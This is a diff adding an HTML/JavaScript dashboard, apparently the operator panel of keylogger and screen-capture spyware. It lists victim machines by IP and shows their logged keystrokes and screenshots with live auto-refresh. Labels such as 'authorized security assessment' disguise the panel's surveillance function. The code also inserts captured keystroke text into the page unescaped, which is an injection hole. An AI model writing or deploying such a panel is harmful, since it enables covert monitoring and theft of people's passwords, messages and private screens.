@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom Security Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            font-family: 'Inter', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0f 0%, #111827 100%);
+        }
+        
+        .card-gradient {
+            background: linear-gradient(145deg, #1a1a2e 0%, #16213e 100%);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .header-gradient {
+            background: linear-gradient(90deg, #000000 0%, #111827 100%);
+        }
+        
+        .accent-border {
+            border-color: #2d3748;
+        }
+        
+        .glow {
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.1);
+        }
+        
+        .status-online {
+            background: linear-gradient(90deg, #10b981 0%, #059669 100%);
+        }
+        
+        .status-offline {
+            background: linear-gradient(90deg, #ef4444 0%, #dc2626 100%);
+        }
+        
+        .modal-backdrop {
+            background: rgba(0, 0, 0, 0.85);
+        }
+        
+        .nav-tab {
+            transition: all 0.3s ease;
+            border-bottom: 2px solid transparent;
+        }
+        
+        .nav-tab.active {
+            border-bottom-color: #3b82f6;
+            color: #3b82f6;
+        }
+        
+        .status-pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .keystroke-badge {
+            background: linear-gradient(90deg, #1e40af 0%, #1e3a8a 100%);
+        }
+        
+        .screenshot-badge {
+            background: linear-gradient(90deg, #7c3aed 0%, #6d28d9 100%);
+        }
+        
+        .legal-overlay {
+            background: linear-gradient(90deg, #1e293b 0%, #334155 100%);
+            border-left: 4px solid #dc2626;
+        }
+        
+        .data-card {
+            background: rgba(17, 24, 39, 0.7);
+            backdrop-filter: blur(10px);
+        }
+        
+        .table-header {
+            background: rgba(30, 41, 59, 0.8);
+        }
+        
+        .table-row:hover {
+            background: rgba(51, 65, 85, 0.3);
+        }
+        
+        .metric-card {
+            background: linear-gradient(135deg, rgba(30, 41, 59, 0.7) 0%, rgba(15, 23, 42, 0.7) 100%);
+        }
+    </style>
+</head>
+<body class="text-gray-200">
+    <!-- Navigation -->
+    <nav class="header-gradient border-b border-gray-800">
+        <div class="container mx-auto px-6 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-3">
+                    <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
+                        <i class="fas fa-shield-alt text-white"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-xl font-bold text-white tracking-tight">Phantom Security Dashboard</h1>
+                        <p class="text-xs text-gray-400">Enterprise Security Assessment Platform</p>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <div class="flex space-x-2">
+                        <div class="nav-tab active px-4 py-2 cursor-pointer text-sm font-medium">
+                            <i class="fas fa-desktop mr-2"></i>Systems
+                        </div>
+                        <div class="nav-tab px-4 py-2 cursor-pointer text-sm font-medium text-gray-400 hover:text-white">
+                            <i class="fas fa-chart-bar mr-2"></i>Analytics
+                        </div>
+                        <div class="nav-tab px-4 py-2 cursor-pointer text-sm font-medium text-gray-400 hover:text-white">
+                            <i class="fas fa-cog mr-2"></i>Settings
+                        </div>
+                    </div>
+                    <div class="w-px h-6 bg-gray-700"></div>
+                    <div class="flex items-center space-x-3">
+                        <div class="text-right">
+                            <p class="text-sm font-medium">Security Operations</p>
+                            <p class="text-xs text-gray-400">Authorized Access Only</p>
+                        </div>
+                        <div class="w-8 h-8 bg-gray-700 rounded-full flex items-center justify-center">
+                            <i class="fas fa-user text-gray-300"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-6 py-8">
+        <!-- Status Bar -->
+        <div class="flex justify-between items-center mb-8">
+            <div>
+                <h2 class="text-2xl font-bold text-white">Active Assessment Systems</h2>
+                <p class="text-gray-400">Real-time monitoring of authorized security testing endpoints</p>
+            </div>
+            <div class="flex space-x-3">
+                <button onclick="loadDevices()" class="px-4 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-lg transition-colors duration-200 flex items-center">
+                    <i class="fas fa-sync-alt mr-2"></i>Refresh
+                </button>
+                <button onclick="startAutoRefresh()" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors duration-200 flex items-center">
+                    <i class="fas fa-play mr-2"></i>Live Monitoring
+                </button>
+                <button onclick="stopAutoRefresh()" class="px-4 py-2 bg-gray-800 hover:bg-gray-700 text-white rounded-lg transition-colors duration-200 flex items-center">
+                    <i class="fas fa-pause mr-2"></i>Pause
+                </button>
+            </div>
+        </div>
+
+        <!-- Metrics Dashboard -->
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
+            <div class="metric-card rounded-xl p-6 glow">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Active Systems</p>
+                        <p id="activeCount" class="text-3xl font-bold text-white mt-2">0</p>
+                    </div>
+                    <div class="w-12 h-12 bg-blue-900/30 rounded-lg flex items-center justify-center">
+                        <i class="fas fa-desktop text-blue-400 text-xl"></i>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <div class="h-1 bg-gray-700 rounded-full overflow-hidden">
+                        <div id="activeBar" class="h-full bg-green-500 w-0"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="metric-card rounded-xl p-6 glow">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Total Systems</p>
+                        <p id="totalCount" class="text-3xl font-bold text-white mt-2">0</p>
+                    </div>
+                    <div class="w-12 h-12 bg-purple-900/30 rounded-lg flex items-center justify-center">
+                        <i class="fas fa-server text-purple-400 text-xl"></i>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <div class="h-1 bg-gray-700 rounded-full"></div>
+                </div>
+            </div>
+
+            <div class="metric-card rounded-xl p-6 glow">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Input Events</p>
+                        <p id="keystrokeCount" class="text-3xl font-bold text-white mt-2">0</p>
+                    </div>
+                    <div class="w-12 h-12 bg-cyan-900/30 rounded-lg flex items-center justify-center">
+                        <i class="fas fa-keyboard text-cyan-400 text-xl"></i>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <div class="h-1 bg-gray-700 rounded-full overflow-hidden">
+                        <div id="keystrokeBar" class="h-full bg-cyan-500 w-0"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="metric-card rounded-xl p-6 glow">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <p class="text-gray-400 text-sm font-medium uppercase tracking-wider">Screen Captures</p>
+                        <p id="screenshotCount" class="text-3xl font-bold text-white mt-2">0</p>
+                    </div>
+                    <div class="w-12 h-12 bg-pink-900/30 rounded-lg flex items-center justify-center">
+                        <i class="fas fa-camera text-pink-400 text-xl"></i>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <div class="h-1 bg-gray-700 rounded-full overflow-hidden">
+                        <div id="screenshotBar" class="h-full bg-pink-500 w-0"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Legal Compliance Notice -->
+        <div class="legal-overlay rounded-lg p-4 mb-6">
+            <div class="flex items-start">
+                <div class="mr-3 mt-1">
+                    <i class="fas fa-exclamation-circle text-red-400 text-lg"></i>
+                </div>
+                <div>
+                    <p class="text-sm font-medium text-white">Security Compliance Notice</p>
+                    <p class="text-xs text-gray-300 mt-1">
+                        This interface is for authorized security assessment purposes only. All activities are logged and monitored.
+                        Unauthorized access or use violates security policies and applicable laws.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Systems Table -->
+        <div class="card-gradient rounded-xl overflow-hidden mb-8">
+            <div class="px-6 py-4 border-b border-gray-800 flex justify-between items-center">
+                <div>
+                    <h3 class="text-lg font-semibold text-white">Assessment Endpoints</h3>
+                    <p class="text-sm text-gray-400">Connected systems under security evaluation</p>
+                </div>
+                <div class="text-sm text-gray-400">
+                    Last updated: <span id="lastUpdate">--:--:--</span>
+                </div>
+            </div>
+            <div class="p-4">
+                <div id="devices-container">
+                    <div class="text-center py-16">
+                        <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
+                            <i class="fas fa-spinner fa-spin text-2xl text-gray-400"></i>
+                        </div>
+                        <p class="text-gray-400 font-medium">Initializing security assessment interface</p>
+                        <p class="text-gray-500 text-sm mt-2">Loading connected systems...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer Status -->
+        <div class="flex justify-between items-center text-sm text-gray-500">
+            <div class="flex items-center">
+                <div class="w-2 h-2 rounded-full bg-green-500 mr-2"></div>
+                <span>System Status: <span class="text-gray-300">Operational</span></span>
+            </div>
+            <div>
+                <span>Connection: <span id="connectionStatus" class="text-gray-300">Establishing...</span></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="deviceModal" class="fixed inset-0 modal-backdrop hidden items-center justify-center z-50 p-4">
+        <div class="bg-gray-900 rounded-xl w-full max-w-6xl max-h-[90vh] overflow-hidden border border-gray-800">
+            <div class="px-6 py-4 border-b border-gray-800 flex justify-between items-center">
+                <div>
+                    <h3 id="modalTitle" class="text-xl font-bold text-white">System Assessment Details</h3>
+                    <p class="text-sm text-gray-400">Authorized security testing data</p>
+                </div>
+                <button onclick="closeModal()" class="w-8 h-8 rounded-lg bg-gray-800 hover:bg-gray-700 flex items-center justify-center transition-colors">
+                    <i class="fas fa-times text-gray-300"></i>
+                </button>
+            </div>
+            <div id="modalContent" class="p-6 overflow-y-auto max-h-[calc(90vh-80px)]">
+                <!-- Dynamic content -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let autoRefreshInterval = null;
+        let lastUpdateTime = null;
+
+        function formatTime(date) {
+            return date.toLocaleTimeString('en-US', { hour12: false });
+        }
+
+        function updateLastUpdate() {
+            lastUpdateTime = new Date();
+            document.getElementById('lastUpdate').textContent = formatTime(lastUpdateTime);
+        }
+
+        function updateMetrics(devices) {
+            const online = devices.filter(d => d.active).length;
+            const total = devices.length;
+            const totalKeystrokes = devices.reduce((sum, d) => sum + d.keystroke_count, 0);
+            const totalScreenshots = devices.reduce((sum, d) => sum + d.screenshot_count, 0);
+            
+            // Update metric cards
+            document.getElementById('activeCount').textContent = online;
+            document.getElementById('totalCount').textContent = total;
+            document.getElementById('keystrokeCount').textContent = totalKeystrokes.toLocaleString();
+            document.getElementById('screenshotCount').textContent = totalScreenshots.toLocaleString();
+            
+            // Update progress bars
+            const maxDevices = Math.max(total, 1);
+            document.getElementById('activeBar').style.width = `${(online / maxDevices) * 100}%`;
+            
+            const maxKeystrokes = Math.max(totalKeystrokes, 1000);
+            document.getElementById('keystrokeBar').style.width = `${Math.min((totalKeystrokes / maxKeystrokes) * 100, 100)}%`;
+            
+            const maxScreenshots = Math.max(totalScreenshots, 100);
+            document.getElementById('screenshotBar').style.width = `${Math.min((totalScreenshots / maxScreenshots) * 100, 100)}%`;
+            
+            // Update connection status
+            document.getElementById('connectionStatus').textContent = `${online} active of ${total} total`;
+            updateLastUpdate();
+        }
+
+        function loadDevices() {
+            document.getElementById('connectionStatus').textContent = 'Loading...';
+            
+            fetch('/devices')
+                .then(response => response.json())
+                .then(data => {
+                    updateMetrics(data);
+                    renderDevicesTable(data);
+                    document.getElementById('connectionStatus').textContent = 'Connected';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('devices-container').innerHTML = `
+                        <div class="text-center py-12">
+                            <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-red-900/20 flex items-center justify-center">
+                                <i class="fas fa-exclamation-triangle text-2xl text-red-400"></i>
+                            </div>
+                            <p class="text-red-400 font-medium">Connection Error</p>
+                            <p class="text-gray-500 text-sm mt-2">Unable to connect to assessment server</p>
+                        </div>
+                    `;
+                    document.getElementById('connectionStatus').textContent = 'Disconnected';
+                });
+        }
+
+        function renderDevicesTable(devices) {
+            if (devices.length === 0) {
+                document.getElementById('devices-container').innerHTML = `
+                    <div class="text-center py-12">
+                        <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
+                            <i class="fas fa-desktop text-2xl text-gray-400"></i>
+                        </div>
+                        <p class="text-gray-400 font-medium">No Assessment Systems Connected</p>
+                        <p class="text-gray-500 text-sm mt-2">Awaiting connections from security testing endpoints</p>
+                    </div>
+                `;
+                return;
+            }
+
+            const tableHTML = `
+                <div class="overflow-x-auto rounded-lg border border-gray-800">
+                    <table class="w-full">
+                        <thead class="table-header">
+                            <tr>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Status</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">System Identifier</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Network Address</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">First Detected</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Last Activity</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Security Metrics</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-gray-800">
+                            ${devices.map(device => `
+                                <tr class="table-row transition-colors duration-150">
+                                    <td class="px-6 py-4 whitespace-nowrap">
+                                        <div class="flex items-center">
+                                            <div class="w-3 h-3 rounded-full ${device.active ? 'status-online' : 'status-offline'} ${device.active ? 'status-pulse' : ''} mr-2"></div>
+                                            <span class="text-sm ${device.active ? 'text-green-400' : 'text-gray-400'}">
+                                                ${device.active ? 'Active' : 'Inactive'}
+                                            </span>
+                                        </div>
+                                    </td>
+                                    <td class="px-6 py-4">
+                                        <div class="flex items-center">
+                                            <div class="w-8 h-8 rounded-lg bg-gray-800 flex items-center justify-center mr-3">
+                                                <i class="fas fa-laptop text-gray-300"></i>
+                                            </div>
+                                            <div>
+                                                <div class="text-sm font-medium text-white">${device.name}</div>
+                                                <div class="text-xs text-gray-400">ID: ${device.id.substring(0, 8)}</div>
+                                            </div>
+                                        </div>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap">
+                                        <div class="text-sm text-white font-mono">${device.ip}</div>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap">
+                                        <div class="text-sm text-gray-300">${new Date(device.first_seen).toLocaleDateString()}</div>
+                                        <div class="text-xs text-gray-500">${new Date(device.first_seen).toLocaleTimeString()}</div>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap">
+                                        <div class="text-sm ${device.active ? 'text-white' : 'text-gray-400'}">
+                                            ${new Date(device.last_seen).toLocaleDateString()}
+                                        </div>
+                                        <div class="text-xs ${device.active ? 'text-gray-300' : 'text-gray-500'}">
+                                            ${new Date(device.last_seen).toLocaleTimeString()}
+                                        </div>
+                                    </td>
+                                    <td class="px-6 py-4">
+                                        <div class="flex space-x-2">
+                                            <div class="keystroke-badge px-3 py-1 rounded-full text-xs font-medium">
+                                                <i class="fas fa-keyboard mr-1"></i> ${device.keystroke_count}
+                                            </div>
+                                            <div class="screenshot-badge px-3 py-1 rounded-full text-xs font-medium">
+                                                <i class="fas fa-camera mr-1"></i> ${device.screenshot_count}
+                                            </div>
+                                        </div>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap">
+                                        <div class="flex space-x-2">
+                                            <button onclick="viewKeystrokes('${device.id}')" 
+                                                    class="px-3 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg text-sm font-medium transition-colors duration-150 flex items-center">
+                                                <i class="fas fa-keyboard mr-2"></i> Input Log
+                                            </button>
+                                            <button onclick="viewScreenshots('${device.id}')" 
+                                                    class="px-3 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg text-sm font-medium transition-colors duration-150 flex items-center">
+                                                <i class="fas fa-camera mr-2"></i> Captures
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+                            `).join('')}
+                        </tbody>
+                    </table>
+                </div>
+            `;
+            
+            document.getElementById('devices-container').innerHTML = tableHTML;
+        }
+
+        function viewKeystrokes(deviceId) {
+            fetch(`/device/${deviceId}/keystrokes`)
+                .then(response => response.json())
+                .then(data => {
+                    const keystrokesHTML = data.keystrokes.map(k => 
+                        `<div class="data-card rounded-lg p-4 mb-3 border border-gray-800">
+                            <div class="flex justify-between items-start mb-2">
+                                <div class="text-sm font-medium text-gray-300">
+                                    ${new Date(k.timestamp).toLocaleString()}
+                                </div>
+                                <div class="text-xs px-2 py-1 bg-gray-800 rounded text-gray-400">
+                                    Security Assessment Data
+                                </div>
+                            </div>
+                            <div class="font-mono text-sm text-gray-200 bg-black/50 p-3 rounded border border-gray-800 whitespace-pre-wrap break-words">
+                                ${k.data}
+                            </div>
+                        </div>`
+                    ).join('');
+                    
+                    document.getElementById('modalTitle').innerHTML = `Input Analysis - ${data.device.name}`;
+                    document.getElementById('modalContent').innerHTML = `
+                        <div class="mb-6">
+                            <div class="data-card rounded-lg p-4 border border-blue-800/30">
+                                <div class="flex items-center">
+                                    <div class="w-10 h-10 rounded-lg bg-blue-900/30 flex items-center justify-center mr-3">
+                                        <i class="fas fa-laptop text-blue-400"></i>
+                                    </div>
+                                    <div>
+                                        <div class="text-lg font-bold text-white">${data.device.name}</div>
+                                        <div class="text-sm text-gray-400">${data.device.ip} | ${data.device.active ? 'Active' : 'Inactive'}</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <div class="flex justify-between items-center mb-3">
+                                <h4 class="text-lg font-semibold text-white">Recent Security Assessment Data</h4>
+                                <div class="text-sm text-gray-400">${data.keystrokes.length} entries</div>
+                            </div>
+                            <div class="max-h-96 overflow-y-auto">
+                                ${keystrokesHTML.length ? keystrokesHTML : 
+                                    `<div class="text-center py-8">
+                                        <div class="w-12 h-12 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
+                                            <i class="fas fa-clipboard text-gray-400"></i>
+                                        </div>
+                                        <p class="text-gray-400 font-medium">No Assessment Data</p>
+                                        <p class="text-gray-500 text-sm mt-2">No input events recorded for security analysis</p>
+                                    </div>`
+                                }
+                            </div>
+                        </div>
+                    `;
+                    document.getElementById('deviceModal').classList.remove('hidden');
+                });
+        }
+
+        function viewScreenshots(deviceId) {
+            fetch(`/device/${deviceId}/screenshots`)
+                .then(response => response.json())
+                .then(screenshots => {
+                    const screenshotsHTML = screenshots.map((shot, index) => `
+                        <div class="data-card rounded-lg overflow-hidden border border-gray-800">
+                            <div class="p-4 border-b border-gray-800">
+                                <div class="flex justify-between items-center">
+                                    <div class="font-mono text-sm text-gray-300">${shot.filename}</div>
+                                    <div class="text-xs text-gray-500">${new Date(shot.modified).toLocaleString()}</div>
+                                </div>
+                            </div>
+                            <div class="relative bg-black">
+                                <img src="/screenshot/${deviceId}/${shot.filename}" 
+                                     alt="Security Assessment Capture" 
+                                     class="w-full h-48 object-cover hover:opacity-90 transition-opacity cursor-pointer"
+                                     onclick="openImage('/screenshot/${deviceId}/${shot.filename}')">
+                                <div class="absolute top-3 right-3 bg-black/70 text-white text-xs px-2 py-1 rounded">
+                                    ${(shot.size / 1024 / 1024).toFixed(1)} MB
+                                </div>
+                            </div>
+                            <div class="p-3 flex justify-end">
+                                <button onclick="openImage('/screenshot/${deviceId}/${shot.filename}')" 
+                                        class="px-3 py-1 bg-gray-800 hover:bg-gray-700 rounded text-sm transition-colors">
+                                    Full Analysis
+                                </button>
+                            </div>
+                        </div>
+                    `).join('');
+                    
+                    document.getElementById('modalTitle').innerHTML = `Visual Assessment Data`;
+                    document.getElementById('modalContent').innerHTML = `
+                        <div class="mb-6">
+                            <div class="data-card rounded-lg p-4 border border-purple-800/30">
+                                <div class="flex items-center">
+                                    <div class="w-10 h-10 rounded-lg bg-purple-900/30 flex items-center justify-center mr-3">
+                                        <i class="fas fa-camera text-purple-400"></i>
+                                    </div>
+                                    <div>
+                                        <div class="text-lg font-bold text-white">Screen Capture Analysis</div>
+                                        <div class="text-sm text-gray-400">${screenshots.length} visual assessment records</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                ${screenshotsHTML.length ? screenshotsHTML : 
+                                    `<div class="col-span-2 text-center py-12">
+                                        <div class="w-12 h-12 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
+                                            <i class="fas fa-image text-gray-400"></i>
+                                        </div>
+                                        <p class="text-gray-400 font-medium">No Visual Data Available</p>
+                                        <p class="text-gray-500 text-sm mt-2">No screen captures recorded for assessment</p>
+                                    </div>`
+                                }
+                            </div>
+                        </div>
+                    `;
+                    document.getElementById('deviceModal').classList.remove('hidden');
+                });
+        }
+
+        function openImage(url) {
+            window.open(url, '_blank', 'noopener,noreferrer');
+        }
+
+        function closeModal() {
+            document.getElementById('deviceModal').classList.add('hidden');
+        }
+
+        function startAutoRefresh() {
+            stopAutoRefresh();
+            autoRefreshInterval = setInterval(loadDevices, 30000);
+            document.getElementById('connectionStatus').textContent = 'Live Monitoring Active';
+        }
+
+        function stopAutoRefresh() {
+            if (autoRefreshInterval) {
+                clearInterval(autoRefreshInterval);
+                autoRefreshInterval = null;
+                document.getElementById('connectionStatus').textContent = 'Monitoring Paused';
+            }
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            loadDevices();
+            updateLastUpdate();
+            
+            // Auto-refresh on load
+            startAutoRefresh();
+        });
+
+        // Close modal on escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+    </script>
+</body>
+</html>
